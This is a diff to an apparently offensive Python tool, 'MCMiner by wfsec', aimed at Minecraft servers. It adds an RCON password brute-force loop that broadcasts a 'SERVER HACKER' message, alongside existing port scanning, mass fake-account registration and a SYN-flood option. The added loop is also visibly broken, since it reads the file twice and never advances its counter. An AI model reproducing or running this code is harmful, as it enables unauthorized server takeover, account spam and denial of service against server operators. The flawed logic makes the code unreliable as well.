@@ -5,6 +5,7 @@ from random import randint
 import mechanize
 import string
 from scapy.layers.inet import TCP, IP
+from mcrcon import MCRcon
 
 Fore.LR = Fore.LIGHTRED_EX
 Fore.LG = Fore.LIGHTGREEN_EX
@@ -36,6 +37,8 @@ account_dirs = ['Account/', 'Register/', 'register/', 'Profile/', 'profile/', 'u
 FTP = False
 SSH = False
 Website = False
+Server = False
+RCON = False
 
 os.system('title MCMiner by wfsec')
 print(f'''
@@ -57,8 +60,9 @@ PORTS = {21: 'FTP',  # Ports to scan
          443: 'HTTPS',
          3389: 'RDP',
          8080: 'ALT HTTP',
-         19312: 'Bedrock',
-         25565: 'JavaServer'}
+         19132: 'Bedrock',
+         25565: 'JavaServer',
+         25575: 'RCON'}
 
 
 def syn_flood(dst_ip: str, dst_port: int):
@@ -105,6 +109,10 @@ for port in PORTS:
             SSH = True
         if port == 80:
             Website = True
+        if port == 25565:
+            Server = True
+        if port == 25575:
+            RCON = True
         print(f'{Fore.LG}       [+]{Fore.W} Port {port} is open on [{ip}] {Fore.YELLOW}[{port}/{PORTS[port]}]{Fore.W}')
         s.close()
 
@@ -214,14 +222,19 @@ def fuzz():
                                 br.submit()
                                 time.sleep(0.3)
                                 nexturl = br.geturl()
-                                print(f'''
-                 +------------------------------------------------------------------------+            
-                 | {Fore.LG}[{amount}]{Fore.W} Account created:{Fore.LB} {nexturl}{Fore.W}
-                 | Username ---> {Fore.LB}{username}{Fore.W}
-                 | Email ---> {Fore.LB}{email}{Fore.W}
-                 | Password ---> {Fore.LB}{password}{Fore.W}
-                 +
-    ''')
+                                if url == nexturl:
+                                    print(f'''
+                                    +------------------------------------------------------------------------+            
+                                    | {Fore.LG}[{amount}]{Fore.LR} Failed to create account!{Fore.W}
+                                    +''')
+                                else:
+                                    print(f'''
+                     +------------------------------------------------------------------------+            
+                     | {Fore.LG}[{amount}]{Fore.W} Account created:{Fore.LB} {nexturl}{Fore.W}
+                     | Username ---> {Fore.LB}{username}{Fore.W}
+                     | Email ---> {Fore.LB}{email}{Fore.W}
+                     | Password ---> {Fore.LB}{password}{Fore.W}
+                     +''')
             else:
                 meaning = '[OK]'
                 color = Fore.LG
@@ -306,6 +319,22 @@ if SSH:
     else:
         print('''               Ok.
                     ''')
+
+if RCON:
+    if Server:
+        count = 0
+        f = open('rcon_passwords.txt')
+        amount_lines = len(f.readlines())
+        line = f.readlines()
+        while count < amount_lines:
+            password = line[count]
+            print(f'                    {Fore.Y}[*]{Fore.W} Trying {Fore.LB}[{ip}:{password}]{Fore.W}')
+            mcr = MCRcon(ip, password)
+            resp = mcr.command("/say SERVER HACKER!D!!!!!!")
+            print(resp)
+
+    else:
+        print(f'                 {Fore.LR}[!]{Fore.W} No RCON Running on port 25575')
 
 time.sleep(0.3)
 ddos_ask = input('        Do you want to send packets? y/n: ')
